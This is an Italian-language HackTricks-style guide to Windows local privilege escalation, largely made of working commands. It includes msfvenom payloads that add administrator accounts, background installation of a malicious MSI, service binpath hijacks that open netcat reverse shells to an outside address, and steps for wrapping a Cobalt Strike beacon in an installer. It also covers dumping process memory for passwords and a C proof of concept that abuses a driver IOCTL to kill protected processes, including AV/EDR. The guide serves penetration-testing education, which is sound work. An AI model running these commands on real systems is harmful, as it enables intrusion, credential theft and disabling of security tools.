# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Miglior strumento per cercare Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Se non sai cosa sono i Windows Access Tokens, leggi la seguente pagina prima di continuare:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulta la pagina seguente per maggiori informazioni su ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Se non sai cosa sono gli integrity levels in Windows dovresti leggere la seguente pagina prima di continuare:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Ci sono diverse cose in Windows che potrebbero **impedire di enumerare il sistema**, eseguire eseguibili o anche **rilevare le tue attività**. Dovresti **leggere** la seguente **pagina** e **enumerare** tutti questi **meccanismi di difesa** **prima di iniziare la privilege escalation enumeration**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

Verifica se la versione di Windows ha vulnerabilità note (controlla anche le patch applicate).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) è utile per cercare informazioni dettagliate sulle vulnerabilità di sicurezza di Microsoft. Questo database contiene più di 4.700 vulnerabilità di sicurezza, mostrando la **massive attack surface** che un ambiente Windows presenta.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ha watson incorporato)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Ci sono credenziali/Juicy info salvate nelle variabili d'ambiente?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Cronologia di PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

Puoi imparare come abilitarlo in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

I dettagli delle esecuzioni della pipeline di PowerShell vengono registrati, comprendendo i comandi eseguiti, le invocazioni dei comandi e parti di script. Tuttavia, i dettagli completi dell'esecuzione e i risultati dell'output potrebbero non essere catturati.

Per abilitarlo, segui le istruzioni nella sezione "Transcript files" della documentazione, scegliendo **"Module Logging"** invece di **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Per visualizzare gli ultimi 15 eventi nei log di Powershell puoi eseguire:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Viene acquisito un record completo delle attività e del contenuto dell'esecuzione dello script, assicurando che ogni blocco di codice sia documentato durante l'esecuzione. Questo processo preserva una traccia di controllo completa di ogni attività, preziosa per l'analisi forense e per l'analisi di comportamenti malevoli. Documentando tutte le attività al momento dell'esecuzione, si ottengono approfondimenti dettagliati sul processo.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Gli eventi di log relativi al Script Block si trovano nel Visualizzatore eventi di Windows al percorso: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\\
Per visualizzare gli ultimi 20 eventi puoi usare:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Impostazioni Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unità
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

È possibile compromettere il sistema se gli aggiornamenti non vengono richiesti usando http**S** ma http.

Inizi verificando se la rete usa un aggiornamento WSUS non-SSL eseguendo il seguente comando in cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oppure il seguente in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Se ricevi una risposta come una di queste:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` o `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` è impostato su `1`.

Allora, **è sfruttabile.** Se l'ultima chiave di registro è impostata su 0, la voce WSUS verrà ignorata.

Per sfruttare questa vulnerabilità puoi usare strumenti come: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Questi sono script exploit MiTM weaponizzati per iniettare aggiornamenti 'falsi' nel traffico WSUS non-SSL.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Fondamentalmente, questo è il difetto che sfrutta questo bug:

> Se abbiamo il potere di modificare il proxy dell'utente locale, e Windows Updates usa il proxy configurato nelle impostazioni di Internet Explorer, allora abbiamo la possibilità di eseguire localmente [PyWSUS](https://github.com/GoSecure/pywsus) per intercettare il nostro traffico e eseguire codice come utente elevato sul nostro asset.
>
> Inoltre, poiché il servizio WSUS utilizza le impostazioni dell'utente corrente, utilizzerà anche il suo certificate store. Se generiamo un certificato self-signed per l'hostname WSUS e aggiungiamo questo certificato nel certificate store dell'utente corrente, saremo in grado di intercettare sia il traffico HTTP che HTTPS di WSUS. WSUS non utilizza meccanismi simili a HSTS per implementare una validazione di tipo trust-on-first-use sul certificato. Se il certificato presentato è trusted dall'utente e ha l'hostname corretto, verrà accettato dal servizio.

Puoi sfruttare questa vulnerabilità usando lo strumento [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una volta rilasciato).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Molti agent enterprise espongono una superficie IPC su localhost e un canale di aggiornamento privilegiato. Se l'enrollment può essere forzato verso un server controllato dall'attaccante e l'updater si fida di una rogue root CA o di controlli del signer deboli, un utente locale può consegnare un MSI malevolo che il servizio SYSTEM installerà. Vedi una tecnica generalizzata (basata sulla catena Netskope stAgentSvc – CVE-2025-0309) qui:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. Queste condizioni includono ambienti dove **LDAP signing is not enforced**, utenti che possiedono diritti per configurare **Resource-Based Constrained Delegation (RBCD)**, e la capacità per gli utenti di creare computer all'interno del dominio. È importante notare che questi **requirements** sono soddisfatti usando le **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Per maggiori informazioni sul flow dell'attacco consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** queste 2 chiavi di registro sono **abilitate** (valore **0x1**), allora utenti di qualsiasi privilegio possono **installare** (eseguire) `*.msi` come NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se hai una sessione meterpreter puoi automatizzare questa tecnica usando il modulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa il comando `Write-UserAddMSI` di power-up per creare nella directory corrente un file MSI di Windows per eseguire l'escalation dei privilegi. Questo script scrive un installer MSI precompilato che richiede l'aggiunta di un utente/gruppo (quindi avrai bisogno di accesso GUI):
```
Write-UserAddMSI
```
Esegui semplicemente il binario creato per elevare i privilegi.

### MSI Wrapper

Leggi questo tutorial per imparare a creare un MSI wrapper usando questi strumenti. Nota che puoi racchiudere un file "**.bat**" se vuoi **solo** **eseguire** **comandi**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Creare un MSI con WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Creare un MSI con Visual Studio

- **Genera** con Cobalt Strike o Metasploit un **nuovo Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Apri **Visual Studio**, seleziona **Create a new project** e digita "installer" nella casella di ricerca. Seleziona il progetto **Setup Wizard** e clicca **Next**.
- Assegna al progetto un nome, come **AlwaysPrivesc**, usa **`C:\privesc`** per la posizione, seleziona **place solution and project in the same directory**, e clicca **Create**.
- Continua a cliccare **Next** fino ad arrivare al passo 3 di 4 (choose files to include). Clicca **Add** e seleziona il payload Beacon che hai appena generato. Poi clicca **Finish**.
- Seleziona il progetto **AlwaysPrivesc** nel **Solution Explorer** e nelle **Properties**, cambia **TargetPlatform** da **x86** a **x64**.
- Ci sono altre proprietà che puoi modificare, come **Author** e **Manufacturer**, che possono far sembrare l'app installata più legittima.
- Clicca col tasto destro sul progetto e seleziona **View > Custom Actions**.
- Clicca col destro su **Install** e seleziona **Add Custom Action**.
- Doppio clic su **Application Folder**, seleziona il file **beacon.exe** e clicca **OK**. Questo assicurerà che il payload beacon venga eseguito non appena l'installer viene lanciato.
- Sotto le **Custom Action Properties**, imposta **Run64Bit** su **True**.
- Infine, **buildalo**.
- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### Installazione MSI

Per eseguire l'**installazione** del file `.msi` malevolo in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Per sfruttare questa vulnerabilità puoi utilizzare: _exploit/windows/local/always_install_elevated_

## Antivirus e Rilevatori

### Impostazioni di Audit

Queste impostazioni determinano ciò che viene **registrato**, quindi dovresti prestare attenzione
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, è interessante sapere dove vengono inviati i log
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

LAPS è progettato per la gestione delle password dell'Administrator locale, garantendo che ogni password sia unica, randomizzata e aggiornata regolarmente sui computer appartenenti a un dominio. Queste password sono memorizzate in modo sicuro in Active Directory e possono essere accessibili solo dagli utenti a cui sono stati concessi permessi sufficienti tramite ACLs, consentendo loro di visualizzare local admin passwords se autorizzati.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se attivo, **plain-text passwords vengono memorizzate in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

A partire da **Windows 8.1**, Microsoft ha introdotto una protezione avanzata per la Local Security Authority (LSA) per **bloccare** i tentativi da parte di processi non affidabili di **leggere la sua memoria** o iniettare codice, rendendo il sistema più sicuro.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** è stato introdotto in **Windows 10**. Il suo scopo è proteggere le credenziali memorizzate su un dispositivo da minacce come gli attacchi pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** vengono autenticati dalla **Local Security Authority** (LSA) e utilizzati dai componenti del sistema operativo. Quando i dati di logon di un utente vengono autenticati da un security package registrato, le domain credentials dell'utente vengono tipicamente stabilite.\
[**Maggiori informazioni su Cached Credentials**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Utenti & Gruppi

### Enumerare utenti & gruppi

Dovresti verificare se alcuni dei gruppi di cui fai parte hanno permessi interessanti
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Gruppi privilegiati

Se **appartieni a qualche gruppo privilegiato potresti essere in grado di escalate privileges**. Scopri i gruppi privilegiati e come abusarne per escalate privileges qui:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipolazione dei token

**Scopri di più** su cosa sia un **token** in questa pagina: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la pagina seguente per **scoprire token interessanti** e come abusarne:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utenti connessi / Sessioni
```bash
qwinsta
klist sessions
```
### Cartelle home
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politica delle password
```bash
net accounts
```
### Ottieni il contenuto degli appunti
```bash
powershell -command "Get-Clipboard"
```
## Processi in esecuzione

### Permessi di file e cartelle

Prima di tutto, elencando i processi **check for passwords inside the command line of the process**.\
Controlla se puoi **overwrite some binary running** o se hai write permissions of the binary folder per sfruttare possibili [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Controlla sempre la possibile presenza di [**electron/cef/chromium debuggers** in esecuzione, potresti abusarne per escalare i privilegi](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Controllo dei permessi dei binari dei processi**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Verifica dei permessi delle cartelle dei binari dei processi (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Puoi creare un dump della memoria di un processo in esecuzione usando **procdump** di sysinternals. Servizi come FTP contengono le **credentials in clear text in memory**; prova a effettuare il dump della memoria e a leggere le credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Applicazioni GUI insicure

**Le applicazioni in esecuzione come SYSTEM possono permettere a un utente di avviare un CMD o esplorare le directory.**

Esempio: "Windows Help and Support" (Windows + F1), cerca "command prompt", clicca su "Click to open Command Prompt"

## Servizi

Ottieni la lista dei servizi:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permessi

Puoi usare **sc** per ottenere informazioni su un servizio
```bash
sc qc <service_name>
```
È consigliabile avere il binario **accesschk** di _Sysinternals_ per verificare il livello di privilegio richiesto per ogni servizio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Si consiglia di verificare se "Authenticated Users" possono modificare qualsiasi servizio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Abilitare il servizio

Se riscontri questo errore (ad esempio con SSDPSRV):

_Si è verificato l'errore di sistema 1058._\
_Il servizio non può essere avviato, sia perché è disabilitato, sia perché non ha dispositivi abilitati associati._ 

Puoi abilitarlo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Tieni presente che il servizio upnphost dipende da SSDPSRV per funzionare (per XP SP1)**

**Un altro workaround** di questo problema è eseguire:
```
sc.exe config usosvc start= auto
```
### **Modifica del percorso del binario del servizio**

Nel caso in cui il gruppo "Authenticated users" possieda **SERVICE_ALL_ACCESS** su un servizio, è possibile modificare il binario eseguibile del servizio. Per modificare ed eseguire **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Riavviare il servizio
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
I privilegi possono essere elevati tramite varie autorizzazioni:

- **SERVICE_CHANGE_CONFIG**: Consente la riconfigurazione del binario del servizio.
- **WRITE_DAC**: Consente la riconfigurazione delle autorizzazioni, portando alla possibilità di modificare le configurazioni del servizio.
- **WRITE_OWNER**: Consente di acquisire la proprietà e di riconfigurare le autorizzazioni.
- **GENERIC_WRITE**: Eredita la capacità di modificare le configurazioni del servizio.
- **GENERIC_ALL**: Anche questo eredita la capacità di modificare le configurazioni del servizio.

Per il rilevamento e lo sfruttamento di questa vulnerabilità, è possibile utilizzare _exploit/windows/local/service_permissions_.

### Permessi deboli dei binari dei servizi

**Controlla se puoi modificare il binario che viene eseguito da un servizio** o se hai **permessi di scrittura sulla cartella** in cui si trova il binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puoi ottenere ogni binario eseguito da un servizio usando **wmic** (non in system32) e controllare i tuoi permessi usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Puoi anche usare **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permessi di modifica del registro dei servizi

Dovresti verificare se puoi modificare qualche registro di servizio.\
Puoi **controllare** i tuoi **permessi** su un **registro di servizio** eseguendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Bisogna verificare se **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** possiedono i permessi `FullControl`. In tal caso, il binario eseguito dal servizio può essere modificato.

Per cambiare il percorso del binario eseguito:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Permessi AppendData/AddSubdirectory sul registro dei Services

Se hai questo permesso su un registro significa che **puoi creare sotto-registri da questo**. Nel caso dei Windows services questo è **sufficiente per eseguire codice arbitrario:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Percorsi dei servizi non racchiusi tra virgolette

Se il percorso di un eseguibile non è racchiuso tra virgolette, Windows tenterà di eseguire ogni segmento che precede uno spazio.

Ad esempio, per il percorso _C:\Program Files\Some Folder\Service.exe_ Windows tenterà di eseguire:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Elenca tutti gli unquoted service paths, escludendo quelli appartenenti ai servizi integrati di Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Puoi rilevare e sfruttare** questa vulnerabilità con metasploit: `exploit/windows/local/trusted\_service\_path` Puoi creare manualmente un binario di servizio con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Azioni di ripristino

Windows consente agli utenti di specificare azioni da eseguire se un servizio fallisce. Questa funzionalità può essere configurata per puntare a un binary. Se questo binary è sostituibile, potrebbe essere possibile privilege escalation. Maggiori dettagli nella [documentazione ufficiale](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applicazioni

### Applicazioni installate

Controlla i **permessi dei binaries** (magari puoi sovrascriverne uno e ottenere privilege escalation) e delle **cartelle** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permessi di scrittura

Verifica se puoi modificare qualche file di configurazione per leggere un file speciale o se puoi modificare un binario che verrà eseguito da un account Administrator (schedtasks).

Un modo per trovare cartelle/file con permessi deboli nel sistema è:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Esecuzione all'avvio

**Verifica se puoi sovrascrivere qualche chiave del registro o binario che verrà eseguito da un altro utente.**\
**Leggi** la **pagina seguente** per saperne di più su interessanti **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Driver

Cerca possibili **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Se un driver espone un arbitrary kernel read/write primitive (common in IOCTL handlers progettati male), puoi effettuare l'escalation rubando un token SYSTEM direttamente dalla memoria kernel. Vedi la tecnica passo‑passo qui:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Alcuni driver firmati di terze parti creano il loro device object con un SDDL restrittivo tramite IoCreateDeviceSecure ma dimenticano di impostare FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Senza questo flag, la secure DACL non viene applicata quando il device viene aperto tramite un percorso contenente un componente extra, permettendo a qualsiasi utente non privilegiato di ottenere un handle usando un namespace path come:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Una volta che un utente può aprire il device, i privilegiati IOCTLs esposti dal driver possono essere abusati per LPE e manomissioni. Esempi di capacità osservate nel mondo reale:
- Restituire handle con accesso completo a processi arbitrari (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Raw disk read/write senza restrizioni (offline tampering, trucchi di persistenza all'avvio).
- Terminare processi arbitrari, inclusi Protected Process/Light (PP/PPL), permettendo AV/EDR kill dallo user land tramite kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
